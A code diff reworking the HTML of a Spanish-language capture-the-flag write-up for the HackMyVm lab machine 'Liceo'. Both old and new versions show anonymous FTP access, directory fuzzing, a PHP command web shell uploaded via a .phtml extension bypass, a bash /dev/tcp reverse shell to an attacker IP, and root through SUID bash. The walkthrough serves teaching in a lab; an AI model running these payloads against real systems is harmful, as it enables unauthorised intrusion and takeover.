@@ -21,211 +21,148 @@
         </div>
     </nav>
 
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1 class="section-title">Writeup: Liceo</h1>
+            <p class="subtitle">Explotación de vulnerabilidades AFU y Escalada SUID</p>
+            <div class="hero-stats" style="display: flex; justify-content: center; gap: 2rem; margin-top: 2rem;">
+                <div class="stat">
+                    <span class="stat-number" style="font-size: 1.5rem; font-weight: bold; color: var(--primary);">Dificultad</span>
+                    <span class="stat-label" style="display: block; color: #22c55e;">Fácil</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-number" style="font-size: 1.5rem; font-weight: bold; color: var(--primary);">Plataforma</span>
+                    <span class="stat-label" style="display: block; color: var(--text-secondary);">HackMyVm</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
     <main class="container">
         <article class="writeup-content">
-            <h2>PRESENTACIÓN LICEO</h2>
-            <p>Liceo es una máquina creada para todas aquellas personas que desean iniciarse en la ciberseguridad, especialmente en el mundo del pentesting.</p>
-            <p>La máquina consta de varias partes que requieren habilidades específicas para completar su explotación. El objetivo principal es incentivar y dar visibilidad al pentesting mediante este reto. En el pentesting de explotación de sistemas, podemos encontrar diversas dificultades para comprenderlo, pero después de una larga trayectoria en este sector, he decidido crear Liceo para ofrecer un ejemplo de explotación de sistemas sencillo.</p>
+            <section class="writeup-section">
+                <h2>PRESENTACIÓN LICEO</h2>
+                <p>Liceo es una máquina creada para todas aquellas personas que desean iniciarse en la ciberseguridad, especialmente en el mundo del pentesting.</p>
+                <p>El objetivo principal es incentivar y dar visibilidad al pentesting mediante este reto. Ofrece un ejemplo de explotación de sistemas sencillo e intuitivo.</p>
+                
+                <div class="download-box">
+                    <h3>¿DÓNDE SE PUEDE DESCARGAR?</h3>
+                    <p>Disponible en la web de HackMyVm.</p>
+                    <a href="https://mega.nz/file/ul1HhbCI#JwfYJMbUhHqycoubeOyvSXjhoXlvOqgkDQxjwWwJ9ag" target="_blank" class="cta-button" style="padding: 0.8rem 1.5rem; font-size: 0.9rem; min-width: auto;">Descargar Máquina</a>
+                </div>
+            </section>
 
-            <h3>¿DÓNDE SE PUEDE DESCARGAR LA MÁQUINA?</h3>
-            <p>La máquina se encuentra disponible para descargar en la web de HackMyVm.</p>
-            <h4>URL de descarga directa: <a href="https://mega.nz/file/ul1HhbCI#JwfYJMbUhHqycoubeOyvSXjhoXlvOqgkDQxjwWwJ9ag" target="_blank">https://mega.nz/file/ul1HhbCI#JwfYJMbUhHqycoubeOyvSXjhoXlvOqgkDQxjwWwJ9ag</a></h4>
+            <section class="writeup-section">
+                <h3>Requisitos</h3>
+                <ul class="requirements-list">
+                    <li>Sistema Operativo Kali Linux o similar.</li>
+                    <li>Máquinas en la misma Red.</li>
+                </ul>
+            </section>
 
-            <h1>WRITEUP LICEO</h1>
+            <section class="writeup-section">
+                <h3>Enumeración</h3>
+                <p>Identificamos la IP de la máquina víctima para comenzar el escaneo de servicios.</p>
+                <div class="info-badge">IP TARGET: <code>10.0.2.4</code></div>
 
-            <h3>Requisitos</h3>
-            <ul>
-                <li>Sistema Operativo Kali Linux o similar.</li>
-                <li>Máquinas en la misma Red.</li>
-            </ul>
+                <p>Escaneo de puertos con Nmap:</p>
+                <pre><code>❯ sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.0.2.4 -oG allPorts
 
-            <h3>Enumeración</h3>
-            <p>El primer paso para poder comenzar una máquina es realizar la enumeración de los servicios que la máquina víctima está corriendo para ello, primero de todo deberemos de saber la IP de la máquina víctima.</p>
-            <h5>IP MÁQUINA VÍCTIMA (TARGET)</h5>
-            <pre><code>10.0.2.4</code></pre>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.9p1
+80/tcp open  http    Apache httpd 2.4.52</code></pre>
 
-            <p>Una vez tenemos la dirección IP de la máquina víctima, podemos empezar con la enumeración de servicios. Utilizando el comando Nmap con sus respectivos parámetros, vamos a poder identificar los servicios y versiones que se están ejecutando en los puertos.</p>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>PUERTO</th>
+                                <th>SERVICIO</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>21</td><td>FTP</td></tr>
+                            <tr><td>22</td><td>SSH</td></tr>
+                            <tr><td>80</td><td>HTTP</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
 
-            <pre><code>❯ sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.0.2.4 -oG allPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 17:06 EST
-...
-PORT   STATE SERVICE REASON         VERSION
-21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
-22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
-...</code></pre>
-
-            <table>
-                <thead>
-                    <tr>
-                        <th>PUERTOS</th>
-                        <th>SERVICIO</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td>21</td>
-                        <td>FTP</td>
-                    </tr>
-                    <tr>
-                        <td>22</td>
-                        <td>SSH</td>
-                    </tr>
-                    <tr>
-                        <td>80</td>
-                        <td>HTTP</td>
-                    </tr>
-                </tbody>
-            </table>
-
-            <h3>Intrusión</h3>
-            <p>Una vez que ejecutamos Nmap, la primera información del primer puerto es el 21 (FTP), que nos indica que se permite el acceso con el usuario anónimo (Anonymous).</p>
-
-            <pre><code>❯ ftp 10.0.2.4
-Connected to 10.0.2.4.
-220 (vsFTPd 3.0.5)
-Name (10.0.2.4:kali): Anonymous 
-331 Please specify the password.
+            <section class="writeup-section">
+                <h3>Intrusión</h3>
+                <p>Acceso mediante usuario <strong>Anonymous</strong> en el servicio FTP:</p>
+                <pre><code>❯ ftp 10.0.2.4
+Name: Anonymous
 Password: 
-230 Login successful.
+230 Login successful.</code></pre>
+
+                <p>Localizamos un archivo <code>note.txt</code> con información relevante sobre una posible vulnerabilidad web.</p>
+                <div class="note-box">
+                    "Hi Matias, I have left on the web the continuations of today's work... we don't want intruders..."
+                </div>
+
+                <p>Realizamos fuzzing web para encontrar paneles de subida:</p>
+                <pre><code>❯ gobuster dir -u http://10.0.2.4/ -w directory-list-2.3-medium.txt -x php,html
+
+/uploads (Status: 301)
+/upload.php (Status: 200)</code></pre>
+            </section>
+
+            <section class="writeup-section">
+                <h3>Explotación: AFU -> RCE</h3>
+                <p>Encontramos una vulnerabilidad de <strong>Arbitrary File Upload</strong>. Intentamos subir un archivo PHP malicioso para obtener ejecución remota de comandos.</p>
+                
+                <div class="image-wrapper">
+                    <img src="images/image-20240211233940955.png" alt="Upload Interface">
+                </div>
+
+                <p>Bypass de extensión: Cambiamos <code>.php</code> por <code>.phtml</code> para evadir el filtro.</p>
+                <pre><code>❯ mv vuln.php vuln.phtml</code></pre>
+
+                <div class="image-wrapper">
+                    <img src="images/image-20240212005056381.png" alt="Success Bypass">
+                </div>
+
+                <p>Ejecutamos una <strong>Reverse Shell</strong> codificada en URL para obtener acceso al sistema:</p>
+                <pre><code>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.5%2F443%200%3E%261%22</code></pre>
+                
+                <div class="image-wrapper">
+                    <img src="images/image-20240212020957901.png" alt="Access Granted">
+                </div>
+            </section>
+
+            <section class="writeup-section">
+                <h3>Escalada de Privilegios</h3>
+                <p>Tratamiento de la TTY y búsqueda de binarios con permisos <strong>SUID</strong>:</p>
+                <pre><code>www-data@liceoserver:/$ find / -perm -4000 2>/dev/null
 ...
-ftp> ls
--rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
-ftp> </code></pre>
-
-            <p>Una vez dentro, al ejecutar el comando 'ls', nos damos cuenta de que hay un archivo de texto llamado 'note.txt'. Para obtener el contenido del archivo, vamos a usar el comando 'more'.</p>
-
-            <pre><code>ftp> more note.txt
-
-Hi Matias, I have left on the web the continuations of today's work, 
-would you mind contiuing in your turn and make sure that the web will be secure? 
-Above all, we dont't want intruders...
-(END)</code></pre>
-
-            <p>Gracias a esta nota podemos saber que hay algún tipo de vulnerabilidad en la web, la cual nos podría ayudar a obtener acceso al interior del sistema de la empresa. Una vez hemos terminado de leer la nota, vamos a visitar el sitio web de la compañía.</p>
-
-            <p>Después de terminar de observar la web y comprobar que no hay ninguna pista sobre la posible vulnerabilidad de la página web, vamos a proceder a realizar fuzzing en la página web.</p>
-
-            <pre><code>❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.4/ -x php,html,txt -t 100
-...
-/uploads              (Status: 301) [Size: 306] [--> http://10.0.2.4/uploads/]
-/upload.php           (Status: 200) [Size: 371]
-...</code></pre>
-
-            <h3>Explotación vulnerabilidad AFU - RCE (Arbitrary File Upload & Remote Code Execution)</h3>
-            <p>Como observamos en el escaneo, vemos dos directorios sospechosos: en este caso, 'upload.php' y 'uploads'.</p>
-
-            <img src="images/image-20240211233940955.png" alt="Upload Directory Scan" style="float: left; margin-right: 10px;" />
-            <div style="clear: both;"></div>
-
-            <p>Después de visualizar el interior del directorio, observamos de que tenemos la posibilidad de subir archivos dentro de la web de la companía, por lo cual, vamos a intentar de introducir un archivo malicioso con extensión <em>php</em>.</p>
-
-            <h5>CREACIÓN Y CARGA DE ARCHIVO MALICIOSO</h5>
-            <pre><code>❯ cat vuln.php
-<?php 
-system($_GET['cmd'])
-?></code></pre>
-
-            <p>Gracias a este archivo, vamos a poder obtener ejecución de comandos dentro del sistema una vez lo subamos y lo ejecutemos para ello, vamos aprobar de subir el archivo.</p>
-
-            <img src="images/image-20240212002159623.png" alt="Uploading Malicious File" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <p>Cuando intentamos subir el archivo, nos salta un error indicando que no se pueden subir archivos con la extensión .php. Sin embargo, es posible que la validación se esté aplicando únicamente a la extensión .php, aunque los archivos PHP pueden tener otras extensiones como .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp o .module.</p>
-
-            <p>Para cambiar la extensión vamos a usar el comando 'mv' para renombrar la extensión.</p>
-            <pre><code>❯ mv vuln.php vuln.phtml</code></pre>
-
-            <p>Una vez que cambiamos la extensión y la volvemos a subir, veremos que el archivo se carga exitosamente.</p>
-
-            <img src="images/image-20240212005056381.png" alt="Successful Upload" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <p>Para verificar que el archivo se encuentra dentro vamos a ubicarnos en el otro directorio encontrado en el fuzzing llamado '<em>uploads</em>'</p>
-
-            <img src="images/image-20240212011252184.png" alt="Verifying Upload" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <p>En este apartado, veremos que los archivos se suben satisfactoriamente, así que vamos a ejecutarlo pulsando sobre el archivo.</p>
-
-            <img src="images/image-20240212013900670.png" alt="Executing File" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <p>Como se puede observar, no se muestra nada al ejecutar el archivo. Sin embargo, si realizamos una petición a la URL utilizando el código del archivo PHP, podremos comprobar si hay ejecución de comandos para una posible Reverse Shell.</p>
-
-            <img src="images/image-20240212015358982.png" alt="Command Execution Verification" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <p>Después de probar la petición en la URL, observamos que tenemos ejecución de comandos, por lo cual hay que probar que una Reverse Shell nos de acceso al sistema mediante una shell.</p>
-
-            <h5>CREACIÓN REVERSE SHELL</h5>
-            <pre><code>bash -c "bash -i >& /dev/tcp/<IP ATACANTE>/PUERTO_EN_ESCUCHA 0>&1"</code></pre>
-
-            <p>Esta es la Reverse Shell que vamos a utilizar para obtener acceso al sistema. Para que la Reverse Shell funcione en una URL, hay que codificarla para que la web pueda interpretarla correctamente, ya que de otro modo podría no ejecutarse correctamente debido a los espacios en el comando.</p>
-
-            <pre><code>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.5%2F443%200%3E%261%22</code></pre>
-
-            <p>Una vez hemos codificado la URL, vamos a proceder a ponernos en escucha mediante la terminal utilizando el siguiente comando:</p>
-
-            <pre><code>❯ nc -nlvp 443
-listening on [any] 443 ...</code></pre>
-
-            <p>Cuando nos encontremos en escucha, ya podremos ejecutar la shell de la misma manera que hemos efectuado el comando 'id'.</p>
-
-            <pre><code>❯ nc -nlvp 443
-listening on [any] 443 ...
-connect to [10.0.2.5] from (UNKNOWN) [10.0.2.4] 51512
-bash: cannot set terminal process group (724): Inappropriate ioctl for device
-bash-5.1$ </code></pre>
-
-            <p>Si hemos seguido correctamente los pasos, ya tendremos nuestra shell con el usuario 'www-data' dentro del sistema de la compañía.</p>
-
-            <img src="images/image-20240212020957901.png" alt="Access Granted" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <h3>ESCALADA DE PRIVILEGIOS</h3>
-
-            <h5>TRATADO DE TERMINAL</h5>
-            <p>Cuando ingresamos a una máquina mediante la Reverse Shell, es importante configurar adecuadamente la terminal para poder utilizar la shell de forma normal y evitar posibles fallos. Para lograrlo, utilizaremos diversos comandos que mejorarán su seguridad.</p>
-
-            <pre><code>script /dev/null -c bash
-ctrl z
-stty raw -echo; fg
-reset
-xterm
-export TERM=xterm SHELL=bash</code></pre>
-
-            <h5>EXPLOTACIÓN DE PERMISOS SUID</h5>
-            <p>En esta máquina, nos encontramos una explotación de servicios SUID, para poder explotarlo y convertirnos en el usuario root, será necesario conocer cual es el permiso con el que tendremos acceso realizar el salto.</p>
-
-            <pre><code>www-data@liceoserver:/$ find / -perm -4000 2>/dev/null
-...
-/usr/bin/sudo
 /usr/bin/bash
-/usr/bin/fusermount3
 ...</code></pre>
 
-            <p>En este caso, el permiso SUID que está expuesto es el bash, para su misma explotación será necesaria la ejecución del permiso.</p>
+                <p>Explotamos el binario de <code>bash</code> para convertirnos en root:</p>
+                <pre><code>www-data@liceoserver:/# /bin/bash -p
+whoami -> root</code></pre>
 
-            <pre><code>www-data@liceoserver:/# /bin/bash -p
-bash-5.1# whoami
-root</code></pre>
+                <div class="image-wrapper">
+                    <img src="images/image-20240212022710210.png" alt="Root Shell">
+                </div>
+            </section>
 
-            <img src="images/image-20240212022710210.png" alt="Root Access" style="float: left; margin-right: 10px;">
-            <div style="clear: both;"></div>
-
-            <p>Como se puede observar, ahora somos el usuario root, lo que significa que tenemos acceso completo al sistema y lo hemos comprometido.</p>
-
-            <h5>USER FLAG</h5>
-            <pre><code>www-data@liceoserver:/home/dev$ cat user.txt
-##########</code></pre>
-
-            <h5>ROOT FLAG</h5>
-            <pre><code>www-data@liceoserver:/root# cat root.txt 
-##########</code></pre>
+            <section class="writeup-section" style="border-top: 1px solid var(--border-color); padding-top: 2rem;">
+                <div class="flags-container" style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+                    <div class="flag-card" style="background: rgba(124, 58, 237, 0.1); padding: 1rem; border-radius: 10px; border: 1px solid var(--secondary);">
+                        <h4 style="color: var(--secondary); margin-bottom: 0.5rem;">User Flag</h4>
+                        <code style="color: var(--text-primary);">##########</code>
+                    </div>
+                    <div class="flag-card" style="background: rgba(0, 217, 255, 0.1); padding: 1rem; border-radius: 10px; border: 1px solid var(--primary);">
+                        <h4 style="color: var(--primary); margin-bottom: 0.5rem;">Root Flag</h4>
+                        <code style="color: var(--text-primary);">##########</code>
+                    </div>
+                </div>
+            </section>
         </article>
     </main>
 
